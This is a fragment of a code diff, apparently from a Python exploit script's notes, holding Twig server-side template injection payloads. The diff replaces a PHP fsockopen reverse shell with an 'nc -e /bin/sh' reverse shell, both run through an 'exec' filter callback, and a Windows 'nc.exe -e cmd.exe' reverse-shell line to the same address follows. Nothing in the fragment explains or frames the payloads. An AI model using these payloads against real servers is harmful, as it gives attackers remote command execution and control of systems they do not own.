@@ -23,7 +23,7 @@ if __name__ == '__main__':
 
   
 
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("php -r '$sock=fsockopen("192.168.154.128",4242);`/bin/sh -i <&3 >&3 2>&3`;'")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nc -e /bin/sh 192.162.154.128 4242")}}
         
 nc.exe -e cmd.exe 192.168.154.128 4242       
         
